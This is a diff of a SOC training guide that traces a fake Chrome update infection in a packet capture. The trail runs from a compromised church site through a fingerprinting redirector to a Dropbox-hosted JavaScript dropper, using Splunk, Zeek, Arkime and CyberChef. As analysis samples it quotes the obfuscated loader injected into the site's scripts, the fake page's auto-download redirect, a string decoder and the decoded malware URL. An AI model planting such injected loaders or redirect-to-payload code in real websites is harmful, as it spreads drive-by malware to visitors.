+| 20:28:46 | **kimbrelelectric.com** (`bb17eb22.login3.`) | Electrical company name with a generated-looking sub-domain |
+
+!!! question "Question: why is summerhamster.com not kept?"
+    Its DNS answer is a **CNAME** (alias) to `bc.sp-prod.net`, an ad platform, and Chrome made one HTTPS connection to it. Same shape as the other ad domains. **Following the CNAME** is another way to remove the normal:
+
+    ```spl
+    index=zeek sourcetype=zeek:dns pcap_case=20180630_SORTING_THROUGH_THE_ALERTS query="www.summerhamster.com"
+    | table ts query answers
+    ```
+
+### 2-3. Destinations reached with no DNS lookup { #no-dns }
+
+People browse by name. A connection to an IP that was **never looked up** may be an address built into a program.
+
+```spl
+index=zeek sourcetype=zeek:conn pcap_case=20180630_SORTING_THROUGH_THE_ALERTS id_orig_h=172.16.2.169 NOT id_resp_h=172.16.0.0/12 NOT id_resp_h=224.0.0.0/4
+    NOT [search index=zeek sourcetype=zeek:dns pcap_case=20180630_SORTING_THROUGH_THE_ALERTS | mvexpand answers | rename answers as id_resp_h | dedup id_resp_h | fields id_resp_h]
+| eval t=strftime(ts,"%H:%M:%S")
+| stats min(t) as first max(t) as last count values(id_resp_p) as ports values(conn_state) as states sum(orig_bytes) as sent sum(resp_bytes) as received by id_resp_h
+| sort first
 ```
 
-**Reading — rule things out first:**
+- The `[ … ]` **subsearch** runs first: every IP in DNS answers (`mvexpand` splits a multi-value field into one row per value; `rename` matches the conn field name). It returns `(id_resp_h="a" OR id_resp_h="b" …)`; `NOT` keeps only IPs **never** seen in a DNS answer.
+- Caveat: IPs looked up **before** the capture also appear here. Watch for those near the capture start.
 
-- **`*.gvt1.com` with `Microsoft BITS/7.5`** — Google's download servers. The URIs are `/edgedl/release2/chrome_component/.../PepperFlashPlayer.crx3`: Chrome updating its **Flash component** through Windows BITS. Normal, and the reason for most of the 34 MB.
-- **`ocsp.digicert.com`, `crl.microsoft.com`** — certificate checks by Windows (`Microsoft-CryptoAPI`). Normal.
+```text
+id_resp_h         first     last      count  ports  states  sent  received
+46.105.131.66     20:29:00  20:59:06  30     443    REJ     0     0
+107.170.231.118   20:31:14  20:53:51  16     4143   S0      0     0
+```
 
-**What is left, in time order, all within one minute:**
+**[data] Reading:** only **two** of 184 destinations — exactly baseline candidates 1 and 2. The REJ in 2-1's tcp/443 row is 46.105.131.66: port 443 but not HTTPS, refused every time. First seen almost 2 minutes after the capture starts, then repeated for 30 minutes — **a program, not a person**. And 20:29:00 is only **13 seconds** after candidate 3 (`MSIE 7.0`, 20:28:47).
 
-1. `www.stmarybahrain[.]com` — a church website, 52 requests (a whole page with images and scripts).
-2. `track.positiverefreshment[.]org` — 2 s later. A "tracking" name on an unrelated domain.
-3. `lw2e.sineadhollywoodnutt[.]com` — 2 s later. A random-looking sub-domain.
-4. `bb17eb22.login3.kimbrelelectric[.]com` — 50 s later, **POST only**, and a **different User-Agent**.
+**Clues so far, in time order:** church site (20:27:52) → `track.` (20:27:54) → `lw2e.` (20:27:56) → Dropbox file server (20:28:00) → `kimbrelelectric` (20:28:46) → `MSIE 7.0` (20:28:47) → no-DNS IP attempts (20:29:00). **[inference]** A site visit led to a download, something non-browser then talked to kimbrelelectric, then hard-coded IPs. Step 3 checks this with HTTP.
 
-The browser (Chrome 67) made 1–3. Something else made 4. Step 3 explains 1–3; Step 4 explains 4.
+**Ticket entry:**
 
-!!! question "Question: the PC also loaded cnn.com and dozens of ad servers — are those part of it?"
-    Look at DNS: `www.cnn.com` was asked at 20:27:52.99, **one second before** the church site, and the ad/CDN names follow from that page. That is the user (or a start-up tab) opening CNN — all HTTPS, all well-known services. They are noise. The test is the **Referer** (next step): none of the ad requests point back to the church site, but every suspicious request does.
+```text
+[1951 261124, Sung] – Looking for external connections by 172.16.2.169 without a DNS lookup – Found – Further Analysis Required
+```
+
+---
+
+## Step 3 — HTTP: from a church website to a fake Chrome update { #http }
+
+### 3-1. HTTP by host { #http-hosts }
+
+```spl
+index=zeek sourcetype=zeek:http pcap_case=20180630_SORTING_THROUGH_THE_ALERTS
+| eval host=mvdedup(host)
+| eval t=strftime(ts,"%H:%M:%S")
+| stats count min(t) as first values(method) as methods values(user_agent) as user_agents sum(response_body_len) as received by host
+| sort first
+```
+
+- `host` = the HTTP Host header. `method`: GET fetch, POST send, HEAD headers only.
+- `mvdedup(host)` — explained in the box below.
+
+!!! question "Question: the counts came out doubled — why, and is there a permanent fix?"
+    The first run summed to 268 while 134 events were found. In the results `host` had **two identical values**: `["www.stmarybahrain.com","www.stmarybahrain.com"]`.
+
+    pcapbox copies the Zeek JSON key `"host"` into Splunk's built-in `host` field at index time (so `host="…"` searches are fast). At search time `KV_MODE = json` extracts the same key again and **appends** it to the existing `host` field. Zeek's key name collides with Splunk's reserved field name. `stats … by host` counts once per value → every event twice. `zeek:software` (key `host` = IP) had the same issue.
+
+    - **In a query:** `| eval host=mvdedup(host)` removes duplicate values.
+    - **Permanent fix (pcapbox):** add a calculated field to the search-time stanza `[source::/data/zeek/...]` in `/opt/splunk/etc/apps/pcapbox/local/props.conf`, then restart Splunk:
+
+        ```text
+        EVAL-host = mvdedup(host)
+        ```
+
+        Calculated fields run after JSON extraction, so the duplicate is removed on every search, for data already indexed — no re-ingest. Check: `… | eval n=mvcount(host) | stats count by n` should give only `n=1`.
+    - Keep the `mvdedup` habit on team Splunks whose config you cannot change; it does no harm where there is no duplicate.
+
+```text
+host                                   count  first     methods    user_agents                              received
+www.stmarybahrain.com                  52     20:27:53  GET        Mozilla/5.0 ... Chrome/67.0.3396.99 ...  1220096
+track.positiverefreshment.org          3      20:27:55  GET        Mozilla/5.0 ... Chrome/67.0.3396.99 ...  10001
+lw2e.sineadhollywoodnutt.com           9      20:27:57  GET        Mozilla/5.0 ... Chrome/67.0.3396.99 ...  321733
+ocsp.digicert.com                      1      20:28:00  GET        Microsoft-CryptoAPI/6.1                  471
+bb17eb22.login3.kimbrelelectric.com    3      20:28:47  POST       Mozilla/4.0 (compatible; MSIE 7.0; ...)  360734
+r4---sn-p5qs7nek.gvt1.com              15     20:33:54  GET HEAD   Microsoft BITS/7.5                       13046157
+redirector.gvt1.com                    32     20:33:54  GET HEAD   Microsoft BITS/7.5                       11101
+... (6 more gvt1.com hosts, BITS)
+crl.microsoft.com                      2      20:43:13  GET        Microsoft-CryptoAPI/6.1                  1012
+```
+
+**[data] Reading:**
+
+- The 28 MB on tcp/80 is **BITS from Google's download servers (`gvt1.com`)** from 20:33:54 — a Windows background download. Normal.
+- Programs match 1-5: Chrome → church site, `track.`, `lw2e.`; CryptoAPI → certificate servers; BITS → Google.
+- **`MSIE 7.0` → only kimbrelelectric.com, only POST, three times**, ~360 KB received. Browsing is mostly GET. A non-browser program **sent data and got a lot back**.
 
 ### 3-2. Who sent the browser where — the Referer chain { #referer }
 
-**Goal:** prove that 2 and 3 came **from** the church site, not from another tab.
+The **Referer** header says "I came from this page". Following it shows which page called which. (HTTP spells it *Referer*; Zeek names the field `referrer`.)
 
 ```spl
-index=zeek sourcetype=zeek:http pcap_case=20180630_SORTING_ALERTS host IN ("www.stmarybahrain.com","track.positiverefreshment.org","lw2e.sineadhollywoodnutt.com")
+index=zeek sourcetype=zeek:http pcap_case=20180630_SORTING_THROUGH_THE_ALERTS host IN ("www.stmarybahrain.com","track.positiverefreshment.org","lw2e.sineadhollywoodnutt.com")
 | eval t=strftime(ts,"%H:%M:%S.%3N")
-| dedup host uri
+| search NOT uri="*.jpg*" NOT uri="*.png*" NOT uri="*.gif*" NOT uri="*.css*"
 | sort ts
 | table t host uri referrer status_code resp_mime_types response_body_len
-| search NOT uri="*.jpg" NOT uri="*.gif" NOT uri="*.png" NOT uri="*.css"
 ```
 
-- Line 1: `host IN (...)` — only the three hosts.
-- `dedup host uri` — one row per page (drop repeats).
-- `referrer` — Zeek's name for the **Referer** header: the page that asked for this one.
-- Last line: hide images and style sheets so the scripts and pages stand out. `NOT` = exclude.
+- `host IN ("a","b")` = `host="a" OR host="b"`. `%3N` = milliseconds. The `search NOT …` line hides images and style sheets.
+- `status_code`: 200 OK, 301/302 moved, 404 not found. `resp_mime_types` = Zeek's guess from the **content**.
 
 ```text
-t              host                            uri                                                     referrer                                    status  mime                    len
-20:27:53.623   www.stmarybahrain.com           /                                                       -                                           200     text/html               ...
-20:27:53.765   www.stmarybahrain.com           /new                                                    http://www.stmarybahrain.com/               301     text/html               ...
-20:27:53.892   www.stmarybahrain.com           /new/                                                   http://www.stmarybahrain.com/               200     text/html               31295
-20:27:54.637   www.stmarybahrain.com           /new/modules/mod_ariextmenu/mod_ariextmenu/js/ext-core.js  http://www.stmarybahrain.com/new/       200     text/plain              ...
-20:27:54.749   www.stmarybahrain.com           /new/modules/mod_ariextmenu/mod_ariextmenu/js/menu.min.js  http://www.stmarybahrain.com/new/       200     text/plain              ...
-...
-20:27:55.731   track.positiverefreshment.org   /s_code.js?cid=220&v=24eca7c911f5e102e2ba              http://www.stmarybahrain.com/new/           200     text/plain              2761
-20:27:56.081   track.positiverefreshment.org   /s_code.js?cid=220&v=77e997b1f7de3bc9b07d&rand=...&key=...&0=0&1=&2=16   http://www.stmarybahrain.com/new/   200   text/plain   4911
-20:27:56.467   track.positiverefreshment.org   /s_code.js?cid=220&v=5f210213d05805d3ca4d&rand=...&0=Mozilla&1=Netscape&2=5.0 (Windows...   http://www.stmarybahrain.com/new/   200   text/plain   2329
-20:27:57.029   lw2e.sineadhollywoodnutt.com    /topics/index.php?s=775118&b=220&a=88a209071dc04d3568f791712c740240   http://www.stmarybahrain.com/new/   200   text/plain   4399
-20:27:57.302   lw2e.sineadhollywoodnutt.com    /chromefiles/css.css                                    http://www.stmarybahrain.com/new/           200     text/plain              8304
+t              host                            uri                                                         referrer                             status  mime                     len
+20:27:53.623   www.stmarybahrain.com           /                                                           -                                    200     text/html                155
+20:27:53.765   www.stmarybahrain.com           /new                                                        http://www.stmarybahrain.com/        301     text/html                241
+20:27:53.892   www.stmarybahrain.com           /new/                                                       http://www.stmarybahrain.com/        200     text/html                31295
+20:27:54.629   www.stmarybahrain.com           /new/media/system/js/mootools.js                            http://www.stmarybahrain.com/new/    200     text/plain               75192
+...            (caption.js, ext-core.js, menu.min.js, md_stylechanger.js, jquery.js [application/javascript], s3Slider.js)
+20:27:55.731   track.positiverefreshment.org   /s_code.js?cid=220&v=24eca7c911f5e102e2ba                   http://www.stmarybahrain.com/new/    200     application/javascript   2761
+20:27:56.081   track.positiverefreshment.org   /s_code.js?cid=220&v=77e997b1…&rand=…&key=…&0=0&1=&2=16       http://www.stmarybahrain.com/new/    200     application/javascript   4911
+20:27:56.468   track.positiverefreshment.org   /s_code.js?cid=220&v=5f210213…&0=Mozilla&1=Netscape&2=5.0 (Windows NT 6.1; …)…   http://www.stmarybahrain.com/new/   200   application/javascript   2329
+20:27:57.029   lw2e.sineadhollywoodnutt.com    /topics/index.php?s=775118&b=220&a=88a209071dc04d3568f791712c740240   http://www.stmarybahrain.com/new/   200   application/javascript   4399
+20:27:58.485   lw2e.sineadhollywoodnutt.com    /chromefiles/k3k702ZOKiLJc3WVjuplzOgdm0LZdjqr5-oayXSOefg.woff2   http://lw2e.sineadhollywoodnutt.com/chromefiles/css.css   200   application/font-woff2   16276
 ```
 
-**Reading:**
+**[data] Reading:**
 
-- Every request to the two strange hosts has **Referer `http://www.stmarybahrain.com/new/`**. The church page itself loaded them — the site is **compromised**.
-- The first `GET /` has **no Referer**: the user typed the address or used a bookmark. No phishing email or search result in front of it.
-- `s_code.js` is asked **three times**, and each URL is longer than the last. The third carries the browser name, the full User-Agent, the language and many numbers (`&0=Mozilla&1=Netscape&2=5.0 (Windows...`). That is a **browser fingerprint**: a redirector (**TDS**, traffic distribution system) deciding whether this visitor is worth infecting — Windows yes, Android no, security researcher no.
-- `cid=220` (TDS) and `b=220` (fake page) carry the **same number** — same campaign.
-- The fake page path is `/topics/index.php`, and its files are in **`/chromefiles/`** (`chrome.min.css`, `chrome_logo_2x.png`, `chrome-new.jpg`). A page dressed up as Chrome, on a domain that is not Google.
-- `resp_mime_types` is Zeek's guess **from the content**. JavaScript is shown as `text/plain` — normal, Zeek has no special JS type.
+1. **20:27:53 — the user opened the church site.** `GET /` has **no Referer**: typed or bookmarked, no phishing link in front. `/` → `/new` (301) → `/new/` (the page), then the site's own seven scripts.
+2. **20:27:55–56 — the church page called a stranger.** `track.positiverefreshment.org` has **Referer `…stmarybahrain.com/new/`**: something inside the church page called it. **[inference]** The site is **compromised**.
+3. **`s_code.js` three times, each URL longer.** The third carries a **browser fingerprint**: browser, full User-Agent, `Win32`, screen `1920x1080`, `en-US`, plugins, the **GPU (`NVIDIA GeForce GT 730`)** and colour settings. This is a **TDS** (traffic distribution system) deciding whether to infect: real Windows PC → pass; VM, sandbox, researcher, phone → filter out.
+4. **20:27:57 — passed.** `lw2e.sineadhollywoodnutt.com/topics/index.php` — again with the church page as Referer. `cid=220` (TDS) and `b=220` (this server): **same number, same campaign**. The reply is JavaScript, not HTML.
+5. **20:27:58 — the disguise.** Fonts and `css.css` from a folder called **`/chromefiles/`**, on a domain that is not Google.
 
-### 3-3. What the hacked site injected (Arkime) { #injected }
+**IP check:**
 
-Splunk shows *that* the site loaded the TDS; it cannot show *how*, because the code is in the response bodies. One look in Arkime:
+```spl
+index=zeek sourcetype=zeek:http pcap_case=20180630_SORTING_THROUGH_THE_ALERTS host IN ("www.stmarybahrain.com","track.positiverefreshment.org","lw2e.sineadhollywoodnutt.com","bb17eb22.login3.kimbrelelectric.com")
+| stats values(id_resp_h) as server_ip by host
+```
 
 ```text
-tags == 20180630_SORTING_ALERTS && host.http == www.stmarybahrain.com && http.uri == *menu.min.js*
+host                                  server_ip
+bb17eb22.login3.kimbrelelectric.com   93.95.100.138
+lw2e.sineadhollywoodnutt.com          93.95.100.178
+track.positiverefreshment.org         185.244.149.74
+www.stmarybahrain.com                 66.226.144.232
 ```
 
-- `host.http` — the HTTP Host. `http.uri == *menu.min.js*` — URI contains `menu.min.js` (`*` = anything).
+**93.95.100.178** (fake page) and **93.95.100.138** (kimbrelelectric) share `93.95.100` — the **same /24**. Unrelated names, same server block: **[inference]** same operator.
 
-Expand the session → scroll to the end of the **response**. After the real menu code there is an extra block:
+**Ticket entry:**
 
 ```text
-;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];
-if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){
-var w=document.createElement('script');w.type='text/javascript';w.async=true;
-w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');
-...
+[2005 261124, Sung] – Investigating HTTP referer chain from www.stmarybahrain.com to track.positiverefreshment.org and lw2e.sineadhollywoodnutt.com – Found – Further Analysis Required
 ```
 
-The strings are hidden with a simple trick in the function `b()`: **keep every second character, then reverse the string**. CyberChef does the same in two steps:
+### 3-3. The fake page's content (Arkime) { #fake-page }
 
-1. Paste the quoted text (without the quotes) into **Input**.
-2. **Find / Replace** — Find `(.)(.)` (type **Regex**), Replace `$2`, **Global match** on. This keeps the second character of every pair.
-3. **Reverse** (By Character).
-
-| Hidden string | Decoded |
-|---|---|
-| `st{n(e4g9A2r,exs,u8` | `userAgent` |
-| `je,i{kaofo6c(` | `cookie` |
-| `hs{w{o{d;n,i5W)` | `Windows` |
-| `rd4i{ojr}d;n)A}` | `Android` |
-| `:=ea)m,t3u{_,_4_5` | `___utma=` |
-| `5a{b)28e;...p)tnt}h8` | `http://track.positiverefreshment.org/s_code.js?cid=220&v=24eca7c911f5e102e2ba` |
-
-So the injected code says: **"if the browser is on Windows and not Android, and has no `___utma=` cookie yet (has not been here before), load the TDS script."** The cookie check makes the attack show only **once** per victim — a reason it is hard to reproduce.
-
-!!! note "If the string length is odd"
-    `(.)(.)` leaves the last single character untouched, and after **Reverse** it becomes the **first** character of the output (`y` in `yhttp://...`). Ignore it — `b()` drops it too.
-
-!!! question "Question: is it only in menu.min.js?"
-    Check the other scripts the same way, or search all site bodies at once in Arkime:
-
-    ```text
-    tags == 20180630_SORTING_ALERTS && host.http == www.stmarybahrain.com && http.uri == *.js*
-    ```
-
-    Open each. The same block is appended to **seven** files: `menu.min.js`, `ext-core.js`, `mootools.js`, `caption.js`, `jquery.js`, `s3Slider.js`, `md_stylechanger.js`. The attacker changed the site's own files — the site owner must clean all of them, which goes into the ticket as "compromised site".
-
-### 3-4. The TDS reply and the fake page (Arkime + CyberChef) { #tds }
-
-**Goal:** find how the browser got from `s_code.js` to the fake page, and what the fake page tells the browser to download.
-
-**TDS reply.** In Arkime:
+Zeek keeps summaries, **not bodies**. What the page told the browser to do is in the body.
 
 ```text
-tags == 20180630_SORTING_ALERTS && host.http == track.positiverefreshment.org
+tags == 20180630_SORTING_THROUGH_THE_ALERTS && host.http == lw2e.sineadhollywoodnutt.com && http.uri == *index.php*
 ```
 
-Expand the session. Three request/reply pairs. The **third reply** (2,329 bytes) ends with:
-
-```text
-var s=document.createElement('script');s.type='text/javascript';s.async=true;
-s.src=getUrl('o0(4(2;0v4;7mch2,1)741)937gf)8}6,5d3{d{4y0)c)dy1{7y0{9)0;24a;888)=za;&s0(2(2;=ib}&;891(1}577{79=lsj?}p{h8p}.)x}e3d{n}i{/}sic}i}p{oqt5/,m3o;c{.(t6t(u{n)d)ono9w9y;l(l}o{h{d}a,e}n,i5s,.7ey26w(l)/,/):,p;t;t0hy');
-```
-
-Same trick, function renamed to `getUrl`. Same CyberChef recipe:
-
-```text
-http://lw2e.sineadhollywoodnutt.com/topics/index.php?s=775118&b=220&a=88a209071dc04d3568f791712c740240
-```
-
-This is exactly the next URL in the Splunk list (20:27:57.029). **The TDS passed the fingerprint check and handed out the fake page.**
-
-**Fake page.** In Arkime:
-
-```text
-tags == 20180630_SORTING_ALERTS && host.http == lw2e.sineadhollywoodnutt.com && http.uri == *index.php*
-```
-
-The reply is not an HTML page but a **script that rewrites the church page in place** (`document.head.innerHTML = ...`, `document.body.innerHTML = ...`). Read the visible text in it:
+Expand the session (`+`), choose **natural** view and **uncompress**, read the **response**.
 
 ```text
 <title>Update Chrome</title>
-<h1 id="main-title">You are using an older version of Chrome</h1>
-Update now to keep your Chrome browser running smoothly and securely.
-Your download will begin automatically. If not, click here:
-<a ... id="buttonDownload">Update Chrome</a>
-```
+<h1 id="main-title" tabindex="-1">You are using an older version of Chrome</h1>
+<a class="button eula-download-button download-button ..." href="javascript:void(0)" id="buttonDownload">Update Chrome</a>
 
-And at the end:
-
-```text
 var fileUrl = getUrl('#1)=(l)d(?as8j{.)2}2,.y3v.)2(7;_(e,m;odr)h)C,/fs;n{l7i{dim,c7678,d(r99jl6vif(/0s)/lmyopcg.ex(o2b{p,ogr{dv.{w(w(wp/)/,:;s,p;t{t(h,');
 setTimeout(function() { window.location.href = fileUrl; }, 3000);
 document.getElementById('buttonDownload').onclick = function() { window.location.href = fileUrl; return false; };
 ```
 
-CyberChef again:
+**[data] Reading:**
 
-```text
-https://www.dropbox.com/s/fvl9rd86cmdilns/Chrome_72.3.22.js?dl=1
+- The script **replaces the church page in place** (`document.head` / `document.body`): the address bar still shows the church site, the screen shows a **Chrome update page**.
+- **After 3 seconds** (`setTimeout … 3000`) it opens `fileUrl` by itself; the button does the same.
+- Real Chrome never asks a website to update it. **A website offering a browser update is almost always fake.**
+- `fileUrl` is hidden. The function that unhides it is in the same reply:
+
+```javascript
+function getUrl(url) {
+    var res = '';
+    for(var i=0; i<url.length; i++) {
+        if(i%2===1) res += url[i];
+    }
+    res = res.split("").reverse().join("");
+    return res;
+}
 ```
 
-**Reading:**
+| Line | Meaning | CyberChef |
+|---|---|---|
+| `for (… i<url.length …)` | look at every character | — |
+| `if(i%2===1) res += url[i]` | `i%2` = remainder of i/2; keep positions 1, 3, 5 … = **the second of every pair** | Find / Replace `(.)(.)` → `$2` |
+| `split("").reverse().join("")` | split, reverse, join | Reverse |
 
-- The user sees the church site turn into a **Chrome update page**. After **3 seconds** (`setTimeout ... 3000`) the browser opens the download link by itself; the button does the same.
-- The file is **`Chrome_72.3.22.js`** — a **JavaScript file**, not an installer. On Windows a double-clicked `.js` runs in **Windows Script Host (`wscript.exe`)** with the user's rights — outside the browser.
-- It is hosted on **Dropbox** (`dl=1` = download, not preview). A trusted domain over HTTPS: proxies and filters let it through, and the file content cannot be seen in the PCAP.
-- Chrome **67** was the real current version in June 2018; "72.3.22" did not exist — a small clue for users.
+### 3-4. Decoding the URL (CyberChef or the browser console) { #decode-url }
 
-!!! question "Question: why is this called SocGholish / FakeUpdates?"
-    That is the name researchers use for this campaign: **hacked legitimate sites → fingerprinting TDS → fake browser-update page → a JavaScript file → a WScript C2 that profiles the PC and then delivers a second malware**. Every part seen so far matches that pattern. It is still a **pattern match** — without a hash lookup or a vendor signature, the ticket says "SocGholish-style".
+**CyberChef recipe**
+
+1. Input: the text **inside** the quotes (129 characters — check `ABC` under Input).
+2. **Find / Replace** — Find `(.)(.)` (**REGEX**), Replace `$2`, **Global match** on.
+3. **Reverse** — By Character.
+
+`(.)` = any one character, remembered as group 1 / group 2; `$2` = replace the pair with group 2. 129 is odd, so the last character has no pair, is left alone, and after Reverse becomes the **first** output character (`,`). Ignore it.
+
+!!! question "Question: the output was just the input reversed / full of symbols"
+    Two mistakes made on the way, both common:
+
+    - **Find and Replace were swapped** (`$2` in Find, Replace empty). In a regex `$` means "end of line", so `$2` matches nothing and only Reverse runs.
+    - **The quotes were left in the input** (`ABC` showed 131). One extra leading `'` shifts every pair by one, so the recipe picks positions 0, 2, 4 … — exactly the junk characters. In JavaScript the quotes only mark where the text starts and ends; they are not data.
+
+    Habit: when output looks wrong, check the input's **start, end and length** first.
+
+**Shortcut — run only the decode function in a browser console**
+
+1. In an **offline VM** (VMware → Network Adapter → untick *Connected*), open `about:blank`.
+2. **F12 → Console.** On first paste, type `allow pasting` by hand.
+3. Read the function first. **Do not run it if it contains** `window.location`, `document.write`, `innerHTML`, `eval(`, `Function(`, `fetch(`, `XMLHttpRequest`, `new Image`, `setTimeout`. `getUrl` only loops, splits, reverses and returns — safe. Never copy the `setTimeout` / `onclick` lines: they navigate.
+4. Paste the function, Enter → `undefined` (defined, nothing computed yet).
+5. Call it **with quotes this time** (in code, quotes mark text):
+
+```javascript
+getUrl('#1)=(l)d(?as8j{.)2}2,.y3v.)2(7;_(e,m;odr)h)C,/fs;n{l7i{dim,c7678,d(r99jl6vif(/0s)/lmyopcg.ex(o2b{p,ogr{dv.{w(w(wp/)/,:;s,p;t{t(h,')
+```
+
+```text
+'https://www.dropbox.com/s/fvl9rd86cmdilns/Chrome_72.3.22.js?dl=1'
+```
+
+`copy(getUrl('…'))` puts the result on the clipboard. Typical errors: `Unexpected end of input` (missing `}`), `getUrl is not defined` (function not pasted, or a case typo), `Invalid or unexpected token` (a line break inside the string from Arkime's wrapping, or curly quotes).
+
+**[data] Reading the URL:**
+
+| Part | Meaning |
+|---|---|
+| `www.dropbox.com/s/fvl9rd86cmdilns/` | A Dropbox **shared link** uploaded by the attacker |
+| `Chrome_72.3.22.js` | A **JavaScript** file, not an installer (`.exe`). Double-clicked on Windows it runs in **Windows Script Host (`wscript.exe`)** with the user's rights, outside the browser's sandbox |
+| `?dl=1` | Download straight away instead of preview |
+
+Chrome **72** did not exist in June 2018 (the PC runs 67). Dropbox is trusted and HTTPS — filters let it through and the content is invisible in the PCAP.
+
+!!! question "Question: why did Dropbox suddenly appear before the URL was decoded?"
+    It should not have. The right order is **decode the URL → see the domain → search for that domain**. The guide named Dropbox early because the PCAP had been analysed before. What the analyst's own data showed by then: Dropbox in 2-2 at 20:27:59–20:28:00, and `setTimeout(…, 3000)` on a page that loaded at 20:27:57. Timing alone is an **inference**; the decoded URL is the **evidence**.
+
+!!! question "Question: who could work this out without help?"
+    Nobody decodes from scratch. Three habits make it routine: (1) obfuscated text always travels **with its decoder** — find the function around the text and read it; (2) map each command to a CyberChef operation (`%2` → pick characters, `reverse` → Reverse, `atob` → From Base64, `^` → XOR); (3) when the function is simple and safe, **run it** in an offline console. And if it still does not decode, the network alone (fake page → 3 s → Dropbox) is enough for the ticket; write "URL obfuscated, not decoded".
+
+**Ticket entry:**
+
+```text
+[2122 261124, Sung] – Reviewing content of fake page from lw2e.sineadhollywoodnutt.com in Arkime and decoding its download URL – Found – Further Analysis Required
+```
 
 ### 3-5. Did the download happen? (Splunk) { #download }
 
-**Goal:** the download is HTTPS, so there is no URL or file in `http.log`. Look for the **server name** in DNS and TLS instead.
+HTTPS means no URL or file in `http.log`. Use the **SNI** — the server name sent in clear before encryption starts.
 
 ```spl
-index=zeek sourcetype=zeek:ssl pcap_case=20180630_SORTING_ALERTS server_name="*dropbox*"
+index=zeek sourcetype=zeek:ssl pcap_case=20180630_SORTING_THROUGH_THE_ALERTS server_name="*dropbox*"
 | eval t=strftime(ts,"%H:%M:%S.%3N")
 | table t id_resp_h id_resp_p server_name version established
 ```
 
-- `zeek:ssl` — one row per TLS session. `server_name` is the **SNI**: the name the client asks for in plain text before encryption starts.
-- `established` — whether the TLS handshake finished.
-
 ```text
 t              id_resp_h     id_resp_p  server_name                                              version  established
-20:28:00.427   162.125.6.1   443        www.dropbox.com                                          TLSv12   true
-20:28:00.733   162.125.6.2   443        log.getdropbox.com                                       TLSv12   true
 20:28:01.640   162.125.9.6   443        uc7cfbc6f640f168ed8036c6d5bb.dl.dropboxusercontent.com   TLSv12   true
+20:28:00.733   162.125.6.2   443        log.getdropbox.com                                       TLSv12   true
+20:28:00.427   162.125.6.1   443        www.dropbox.com                                          TLSv12   true
 ```
 
-How much came back from the download server:
-
 ```spl
-index=zeek sourcetype=zeek:conn pcap_case=20180630_SORTING_ALERTS id_resp_h=162.125.9.6
+index=zeek sourcetype=zeek:conn pcap_case=20180630_SORTING_THROUGH_THE_ALERTS id_orig_h=172.16.2.169 id_resp_h=162.125.9.6
 | eval t=strftime(ts,"%H:%M:%S")
 | table t id_resp_h id_resp_p duration orig_bytes resp_bytes conn_state
 ```
 
 ```text
-t         id_resp_h    id_resp_p  duration  orig_bytes  resp_bytes  conn_state
-20:28:01  162.125.9.6  443        ...       1237        23469       SF
+t         id_resp_h    id_resp_p  duration   orig_bytes  resp_bytes  conn_state
+20:28:01  162.125.9.6  443        180.389    1237        23469       SF
 ```
 
-**Reading:**
+**[data] Reading:**
 
-- 20:27:57 fake page + 3 s timer → **20:28:00 www.dropbox.com** → **20:28:01 `*.dl.dropboxusercontent.com`** (Dropbox's file server — the `dl=1` link redirects there). The timing fits the script exactly.
-- **~23 KB** came back including TLS overhead — small, as a `.js` file is. The content and its hash are **not visible**; the host operator must collect `C:\Users\lloyd.maxwell\Downloads\Chrome_72.3.22.js` (Step 4 confirms this path).
+- Fake page 20:27:57.029 + 3 s = **20:28:00.4** = the first Dropbox connection. The code and the traffic agree to **0.4 s**; the user did not need to click.
+- `www.dropbox.com` → `log.getdropbox.com` (Dropbox's own page telemetry, normal) → `*.dl.dropboxusercontent.com` (the file server that serves `dl=1`).
+- **~23 KB** received including TLS overhead → a file of roughly 20 KB or less, the size of a script. `SF` = transfer completed.
+- **`duration` 180 s is not transfer time.** The browser keeps the connection open after a download (keep-alive) and closes it when idle.
+- Content and hash are not visible — the host owner must collect `C:\Users\lloyd.maxwell\Downloads\Chrome_72.3.22.js` (location confirmed in 4-5).
+
+Then **45 seconds with no network clue** (20:28:01 → 20:28:46) — about the time it takes to notice the download, click it and let Windows run it.
 
 **Ticket entry:**
 
 ```text
-[0020 261124, Sung] – Investigating HTTP referer chain from www.stmarybahrain.com to fake Chrome update page – Found – Further Analysis Required
-[0034 261124, Sung] – Looking for download of the fake update file by 172.16.2.169 – Found – Further Analysis Required
+[2213 261124, Sung] – Looking for download of Chrome_72.3.22.js from Dropbox by 172.16.2.169 – Found – Further Analysis Required
 ```
 
 ---
 
 ## Step 4 — The script runs: a WScript C2 { #wscript }
 
-### 4-1. A new User-Agent appears { #ua }
+**Goal:** a downloaded file is not an infection until it runs. Find **proof of execution** and what it sent and received.
 
-**Goal:** a downloaded file is not an infection until it **runs**. A script engine does not send Chrome's User-Agent — look for a new one.
-
-```spl
-index=zeek sourcetype=zeek:http pcap_case=20180630_SORTING_ALERTS
-| eval t=strftime(ts,"%H:%M:%S")
-| stats count min(t) as first values(host) as hosts by user_agent
-| sort first
-```
-
-- One row per User-Agent: how many requests, first time, which hosts.
-
-```text
-user_agent                                                                                  count  first     hosts
-Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 ... Chrome/67.0.3396.99 ...     64     20:27:53  lw2e.sineadhollywoodnutt.com track.positiverefreshment.org www.stmarybahrain.com
-Microsoft-CryptoAPI/6.1                                                                     3      20:28:00  crl.microsoft.com ocsp.digicert.com
-Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/7.0; .NET CLR ...)   3      20:28:47  bb17eb22.login3.kimbrelelectric.com
-Microsoft BITS/7.5                                                                          64     20:33:54  redirector.gvt1.com r2---sn-... r4---sn-...
-```
-
-**Reading:** `MSIE 7.0` on Windows 7 with `Trident/7.0` (IE11's engine) is the **default User-Agent of the Windows scripting HTTP objects** (`MSXML2.XMLHTTP`/`WinHttp` called from `wscript.exe`). It appears **46 seconds after the Dropbox download** and is used for exactly one host. → The user opened `Chrome_72.3.22.js`.
-
-### 4-2. The three POSTs { #posts }
+### 4-1. The three POSTs (Splunk) { #posts }
 
 ```spl
